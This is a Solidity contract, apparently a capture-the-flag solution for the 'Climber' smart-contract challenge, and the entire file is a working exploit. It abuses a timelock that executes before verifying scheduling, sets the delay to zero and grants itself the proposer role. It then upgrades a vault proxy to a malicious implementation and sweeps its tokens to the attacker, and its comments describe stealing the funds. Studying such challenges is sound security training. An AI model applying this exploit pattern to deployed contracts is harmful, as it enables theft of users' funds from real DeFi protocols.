//SPDX-License-Identifier: MIT

import "./ClimberTimelock.sol";
import "./ClimberVault.sol";
import "./VaultAttacker.sol";
import "hardhat/console.sol";

pragma solidity ^0.8.0;

contract ClimberAttacker {

    address owner;

    address payable timeLock;
    address vault;
    address token;

    address[]  targets;
    uint256[]  values;
    bytes[]  dataElements;
    bytes32 salt = bytes32("pwnd");

    constructor (address _timeLock, address _vault, address _token) {
        owner = msg.sender;
        timeLock = payable(_timeLock);
        vault = _vault;
        token = _token;
    }

    function attack() public {
        //1: set delay to 0
        addOperation(
            timeLock
            , 0
            , abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0)
        );

        //2: set this contract as proposer
        addOperation(
            timeLock
            , 0
            , abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256("PROPOSER_ROLE"), address(this))
        );

        //3: now that I am a proposer, I can schedule the 2 previous actions in the timelock so that they can be executed
        addOperation(
            address(this)
            , 0
            , abi.encodeWithSelector(this.scheduleOperations.selector)
        ); 

        //4: I send these actions for execution
        executeOperations();

        //5: now I deploy the bad vault and upgrade the vault implementation to the bad one
        addOperation(
            vault
            , 0
            , abi.encodeWithSelector(UUPSUpgradeable.upgradeTo.selector, address(new VaultAttacker()))
        );

        //6: I made the _setSweeper function public so that I can set the sweeper to myself
        addOperation(
            vault
            , 0
            , abi.encodeWithSelector(VaultAttacker._setSweeper.selector, owner)
        );

        //7: I can now call the sweep function to steal the funds and send them to myself
        addOperation(
            vault
            , 0
            , abi.encodeWithSelector(VaultAttacker.sweepFunds.selector, token)
        );

        scheduleOperations();
        //because I'm the proposer, I can execute the operations right away
        executeOperations();

    }

    function addOperation(address target, uint256 value, bytes memory data) internal {
        targets.push(target);
        values.push(value);
        dataElements.push(data);
    }

    function cleanOperations() internal {
        delete targets;
        delete values;
        delete dataElements;
    }

    function executeOperations() internal {
        ClimberTimelock(timeLock).execute(targets, values, dataElements, salt);
        //After executing the operations, we reset the arrays
        cleanOperations();
    }

    function scheduleOperations() public {
        console.log("ClimberAttacker.scheduleOperations: entered by %s", msg.sender);
        ClimberTimelock(timeLock).schedule(targets, values, dataElements, salt);
    }

    

}